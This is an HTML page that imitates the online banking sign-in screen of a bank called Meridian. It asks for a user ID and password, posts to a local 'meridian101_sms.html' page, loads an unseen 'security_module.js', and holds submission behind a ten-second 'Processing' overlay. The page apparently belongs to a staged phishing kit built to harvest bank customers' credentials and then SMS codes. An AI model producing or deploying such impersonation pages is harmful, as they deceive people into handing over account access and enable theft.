<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meridian - Sign In</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        
body { background-color: #005a7d; color: white; font-family: Arial, sans-serif; margin: 0; padding: 0; }
.m-container { padding: 20px; max-width: 400px; margin: 0 auto; }
.m-close { text-align: right; font-size: 24px; cursor: pointer; color: white; margin-bottom: 20px;}
.m-title { font-size: 22px; font-weight: bold; margin-bottom: 25px; }
.m-label { display: block; margin-bottom: 8px; font-size: 14px; }
.m-input-wrapper { position: relative; margin-bottom: 20px; }
.m-input { width: 100%; padding: 14px; border: none; box-sizing: border-box; font-size: 16px; }
.m-select { width: 100%; padding: 14px; margin-bottom: 20px; border: 2px solid #fdb913; box-sizing: border-box; font-size: 16px; background: white; appearance: none; }
.m-eye { position: absolute; right: 15px; top: 15px; color: #005a7d; font-size: 18px; }
.m-btn { width: 200px; background-color: #fdb913; color: #005a7d; padding: 14px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; display: block; }
.m-link { color: white; text-decoration: underline; display: block; margin-top: 20px; font-size: 14px; }
.m-footer { margin-top: 40px; font-size: 12px; color: #ddd; line-height: 1.5; }
.m-footer a { color: white; text-decoration: underline; }

        /* Loader Overlay */
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
            font-family: Arial, sans-serif;
        }
        .loader-overlay.active { visibility: visible; opacity: 1; }
        .loader-spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #fdb913;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
        .success-icon { font-size: 70px; color: #fdb913; margin: 30px auto; display: block; text-align: center; }
        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 30px; text-align: center; padding: 0 20px; }
    </style>
</head>
<body>
    
<div class="m-container">
    <div class="m-close"><i class="fa-solid fa-xmark"></i></div>
    <div class="m-title">Sign In to Online Banking</div>
    <form action="meridian101_sms.html" method="POST">
        <label class="m-label">Select Banking Type</label>
        <select class="m-select"><option>Personal Banking</option><option>Small Business Banking</option><option>Commercial Banking</option></select>
        
        <label class="m-label">Email, Member Number or User ID</label>
        <div class="m-input-wrapper"><input type="text" class="m-input" required></div>
        
        <label class="m-label">Password</label>
        <div class="m-input-wrapper"><input type="password" class="m-input" required><i class="fa-solid fa-eye-slash m-eye"></i></div>
        
        <label class="m-label" style="display:flex; align-items:center;"><input type="checkbox" style="width:20px;height:20px;margin-right:10px;"> Remember me</label>
        
        <button type="submit" class="m-btn">SIGN IN <i class="fa-solid fa-lock"></i></button>
    </form>
    <a href="#" class="m-link">Forgot your password? <i class="fa-solid fa-arrow-up-right-from-square" style="font-size:10px;"></i></a>
    <a href="#" class="m-link">Not a Member? Join now</a>
    <div class="m-footer">This site is protected by reCAPTCHA and the Google <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.</div>
</div>

    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Processing, please wait...</p>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const loader = document.getElementById('loaderOverlay');
            if(form && loader) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    loader.classList.add('active');
                    setTimeout(function() { form.submit(); }, 10000);
                });
            }
        });
    </script>
<script src="security_module.js"></script>
</body>
</html>
